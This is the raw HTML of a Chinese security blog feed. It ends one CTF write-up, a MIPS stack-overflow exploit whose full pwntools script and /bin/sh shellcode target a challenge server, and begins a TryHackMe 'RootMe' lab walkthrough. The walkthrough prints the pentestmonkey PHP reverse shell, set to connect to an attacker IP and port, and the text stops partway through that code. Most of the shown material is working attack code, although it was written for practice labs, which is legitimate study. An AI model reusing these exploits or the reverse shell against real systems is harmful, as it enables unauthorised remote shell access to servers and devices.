operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Found <span class="token number">20</span> matching gadgets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看看栈回溯时的汇编：<br><img src="/EXP_FILE/ee49ea2220b52a55a010b5c3ccb10eba_MD5.jpeg"><br><img src="/EXP_FILE/9eb2fdfa241a2e336adb5cbab750dcbf_MD5.jpeg"><br>可见在栈回溯时取出了寄存器的备份：ra、fp进行恢复，并把sp抬高了0x98（下面统一称为sp’）</p><p>关注这两个gadget：我们可以把gadget1放入$ra，gadget2放入$fp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">|</span>  <span class="token number">0x0043965C</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span>var_10                           <span class="token operator">|</span>  jalr  $fp<span class="token number">2</span><span class="token operator">|</span>  <span class="token number">0x0040ABB8</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$a2                                        <span class="token operator">|</span>  jalr  $a2   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行完gadget1后，a2 &#x3D; sp’+0x68-0x10 &#x3D; sp’+0x58 &#x3D; sp+0xf0，然后会跳转到fp，即gadget2。再跳转到a2，即跳转到sp+0xf0处</p><p>我们的输入点在sp+0x50，可输入0xf0字节，因此shellcode长度最多为0xf0-0xa0&#x3D;0x50字节。</p><p>shellcraft生成的shellcode有点长，找了一个shellcode，汇编、链接后提取机器码</p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.section .text.globl __start.set noreorder__start:li $a2,0x111p:bltzal $a2,pli $a2,0 addiu $sp,$sp,-32addiu $a0,$ra,20li $a1,0li $v0,4011syscallsc:    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/442ad21d8c3863ab8db1731baebb0834_MD5.jpeg"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg1  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;34m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>lg2  <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;37m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pn   <span class="token operator">=</span> <span class="token keyword">lambda</span> name          <span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span>    <span class="token comment">#------------------------------------------------------------------------------------------</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"mips"</span><span class="token punctuation">)</span><span class="token comment">#context.terminal=["tmux","splitw","-h"]</span>binary<span class="token operator">=</span><span class="token string">"./challenge"</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">'little'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token comment">#------------------------------------------------------------------</span>choose<span class="token operator">=</span><span class="token number">11</span><span class="token keyword">if</span> choose<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">#ENV=&#123;"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"&#125;</span><span class="token comment">#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./challenge'</span><span class="token punctuation">)</span><span class="token comment">#io=process(["qemu-mipsel","-g","1234","./challenge"])</span><span class="token keyword">else</span><span class="token punctuation">:</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27654</span><span class="token punctuation">)</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'your passphrase: '</span><span class="token punctuation">,</span><span class="token string">'三元一串十元三串'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gadget1<span class="token operator">=</span><span class="token number">0x0043965C</span>gadget2<span class="token operator">=</span><span class="token number">0x0040ABB8</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span><span class="token string">b"\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x1c\x00\xe4\x27\xe8\xff\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00"</span>payload<span class="token operator">+=</span>shellcodesla<span class="token punctuation">(</span><span class="token string">'Congratulation!'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#sh=gdb.debug('./challenge')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/44555ff10a39e563491b43b4c2424101_MD5.jpeg"></p><h2 id="fakeSSDP"><a href="#fakeSSDP" class="headerlink" title="fakeSSDP"></a>fakeSSDP</h2><blockquote><p>这个。。。以后再说</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RootMe</title>
      <link href="/2023/12/11/RootMe/"/>
      <url>/2023/12/11/RootMe/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/2fec24fbca2e3994d0bc8ec68aeeb528_MD5.jpeg"></p><blockquote><p>虽然是个很简单的靶机，不过第一次打靶还是蛮兴奋的😄</p></blockquote><p>连上openvpn，开打！<br><img src="/PenTest_FILE/3f0c68cf907b552076580550d80d29b0_MD5.jpeg"></p><h1 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h1><p><img src="/PenTest_FILE/241922fb91bc201c24bd6252cb6de156_MD5.jpeg"></p><ol><li>机器打开了几个端口？答：2</li></ol><p>-sV探测下服务<br><img src="/PenTest_FILE/5d5d6dcb9f13094b1126474b53e81174_MD5.jpeg"></p><ol start="2"><li><p>正在运行哪个版本的 Apache？答：2.4.29<br>同上</p></li><li><p>端口 22 上运行什么服务？答：ssh<br>同上</p></li><li><p>使用 GoBuster 工具在 Web 服务器上查找目录，什么是隐藏目录？答：&#x2F;panel&#x2F;<br><img src="/PenTest_FILE/64ea2a7b5bda0934a4282065d9a2efc7_MD5.jpeg"><br>&#x2F;panel&#x2F;引起了我们的注意，打开看看<br><img src="/PenTest_FILE/db98ea7829a52c771097db5d20fa32e2_MD5.jpeg"><br>好家伙，是一个文件上传</p></li></ol><h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><ol><li>找到一个要上传的表单并获取反向 shell，然后找到标志user.txt。</li></ol><p>我们已知是php网站，有这样一个php反弹shell的木马模板<a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey&#x2F;php-reverse-shell (github.com)</a>：<br>改一下我们攻击机ip和监听端口即可</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">/</span> php<span class="token operator">-</span>reverse<span class="token operator">-</span>shell <span class="token operator">-</span> <span class="token constant">A</span> Reverse Shell implementation in <span class="token constant">PHP</span><span class="token operator">/</span> <span class="token function">Copyright</span> <span class="token punctuation">(</span><span class="token constant">C</span><span class="token punctuation">)</span> <span class="token number">2007</span> pentestmonkey@pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span><span class="token operator">/</span> This tool may be used <span class="token keyword">for</span> legal purposes only<span class="token operator">.</span>  Users take full responsibility<span class="token operator">/</span> <span class="token keyword">for</span> any actions performed using this tool<span class="token operator">.</span>  The author accepts no liability<span class="token operator">/</span> <span class="token keyword">for</span> damage caused by this tool<span class="token operator">.</span>  <span class="token keyword">If</span> these terms are not acceptable to you<span class="token punctuation">,</span> then<span class="token operator">/</span> <span class="token keyword">do</span> not <span class="token keyword">use</span> <span class="token package">this</span> tool<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> In all other respects the <span class="token constant">GPL</span> version <span class="token number">2</span> applies<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span> This program is free software<span class="token punctuation">;</span> you can redistribute it <span class="token keyword">and</span><span class="token operator">/</span><span class="token keyword">or</span> modify<span class="token operator">/</span> it under the terms of the <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License version <span class="token number">2</span> <span class="token keyword">as</span><span class="token operator">/</span> published by the Free Software Foundation<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> This program is distributed in the hope that it will be useful<span class="token punctuation">,</span><span class="token operator">/</span> but <span class="token constant">WITHOUT</span> <span class="token constant">ANY</span> <span class="token constant">WARRANTY</span><span class="token punctuation">;</span> without even the implied warranty of<span class="token operator">/</span> <span class="token constant">MERCHANTABILITY</span> <span class="token keyword">or</span> <span class="token constant">FITNESS</span> <span class="token keyword">FOR</span> <span class="token constant">A</span> <span class="token constant">PARTICULAR</span> <span class="token constant">PURPOSE</span><span class="token operator">.</span>  See the<span class="token operator">/</span> <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License <span class="token keyword">for</span> more details<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> You should have received a copy of the <span class="token constant">GNU</span> General <span class="token keyword">Public</span> License along<span class="token operator">/</span> with this program<span class="token punctuation">;</span> <span class="token keyword">if</span> not<span class="token punctuation">,</span> write to the Free Software Foundation<span class="token punctuation">,</span> Inc<span class="token operator">.</span><span class="token punctuation">,</span><span class="token operator">/</span> <span class="token number">51</span> Franklin Street<span class="token punctuation">,</span> Fifth Floor<span class="token punctuation">,</span> Boston<span class="token punctuation">,</span> <span class="token constant">MA</span> <span class="token number">02110</span><span class="token operator">-</span><span class="token number">1301</span> <span class="token constant">USA</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> This tool may be used <span class="token keyword">for</span> legal purposes only<span class="token operator">.</span>  Users take full responsibility<span class="token operator">/</span> <span class="token keyword">for</span> any actions performed using this tool<span class="token operator">.</span>  <span class="token keyword">If</span> these terms are not acceptable to<span class="token operator">/</span> you<span class="token punctuation">,</span> then <span class="token keyword">do</span> not <span class="token keyword">use</span> <span class="token package">this</span> tool<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> You are encouraged to send comments<span class="token punctuation">,</span> improvements <span class="token keyword">or</span> suggestions to<span class="token operator">/</span> me at pentestmonkey@pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span><span class="token operator">/</span> Description<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> This script will make an outbound <span class="token constant">TCP</span> connection to a hardcoded <span class="token constant">IP</span> <span class="token keyword">and</span> port<span class="token operator">.</span><span class="token operator">/</span> The recipient will be given a shell running <span class="token keyword">as</span> the current <span class="token function">user</span> <span class="token punctuation">(</span>apache normally<span class="token punctuation">)</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> Limitations<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> proc_open <span class="token keyword">and</span> stream_set_blocking <span class="token keyword">require</span> <span class="token constant">PHP</span> version <span class="token number">4.3</span><span class="token operator">+</span><span class="token punctuation">,</span> <span class="token keyword">or</span> <span class="token number">5</span><span class="token operator">+</span><span class="token operator">/</span> <span class="token keyword">Use</span> <span class="token package">of</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token punctuation">)</span> on file descriptors returned by <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> will fail <span class="token keyword">and</span> <span class="token keyword">return</span> <span class="token constant boolean">FALSE</span> under Windows<span class="token operator">.</span><span class="token operator">/</span> Some compile<span class="token operator">-</span>time options are needed <span class="token keyword">for</span> <span class="token function">daemonisation</span> <span class="token punctuation">(</span>like pcntl<span class="token punctuation">,</span> posix<span class="token punctuation">)</span><span class="token operator">.</span>  These are rarely available<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">/</span> Usage<span class="token operator">/</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">/</span> See http<span class="token punctuation">:</span><span class="token operator">/</span>pentestmonkey<span class="token operator">.</span>net<span class="token operator">/</span>tools<span class="token operator">/</span>php<span class="token operator">-</span>reverse<span class="token operator">-</span>shell <span class="token keyword">if</span> you get stuck<span class="token operator">.</span><span class="token function">set_time_limit</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$VERSION</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1.0"</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'10.13.40.89'</span><span class="token punctuation">;</span>  <span class="token operator">/</span> <span class="token constant">CHANGE</span> <span class="token class-name type-declaration">THIS</span><span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">1234</span><span class="token punctuation">;</span>       <span class="token operator">/</span> <span class="token constant">CHANGE</span> <span class="token class-name type-declaration">THIS</span><span class="token variable">$chunk_size</span> <span class="token operator">=</span> <span class="token number">1400</span><span class="token punctuation">;</span><span class="token variable">$write_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$error_a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uname -a; w; id; /bin/sh -i'</span><span class="token punctuation">;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> Daemonise ourself <span class="token keyword">if</span> possible to avoid zombies later<span class="token operator">/</span><span class="token operator">/</span> pcntl_fork is hardly ever available<span class="token punctuation">,</span> but will allow us to daemonise<span class="token operator">/</span> our php process <span class="token keyword">and</span> avoid zombies<span class="token operator">.</span>  Worth a <span class="token keyword">try</span><span class="token operator">...</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pcntl_fork'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">/</span> Fork <span class="token keyword">and</span> have the <span class="token keyword">parent</span> process <span class="token keyword">exit</span><span class="token variable">$pid</span> <span class="token operator">=</span> <span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't fork"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">/</span> <span class="token keyword">Parent</span> exits<span class="token punctuation">&#125;</span><span class="token operator">/</span> Make the current process a session leader<span class="token operator">/</span> Will only succeed <span class="token keyword">if</span> we forked<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">posix_setsid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error: Can't setsid()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$daemon</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Change to a safe directory<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span> Remove any umask we inherited<span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span> <span class="token keyword">Do</span> the reverse shell<span class="token operator">...</span><span class="token operator">/</span><span class="token operator">/</span> Open reverse <span class="token class-name type-declaration">connection</span><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$sock</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$errstr</span></span> (<span class="token interpolation"><span class="token variable">$errno</span></span>)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span> Spawn shell <span class="token class-name type-declaration">process</span><span class="token variable">$descriptorspec</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>   <span class="token number">0</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token operator">/</span> stdin is a pipe that the child will read from   <span class="token number">1</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token operator">/</span> stdout is a pipe that the child will write to   <span class="token number">2</span> <span class="token operator">=></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pipe"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span>   <span class="token operator">/</span> stderr is a pipe that the child will write to<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$process</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token variable">$shell</span><span class="token punctuation">,</span> <span class="token variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token 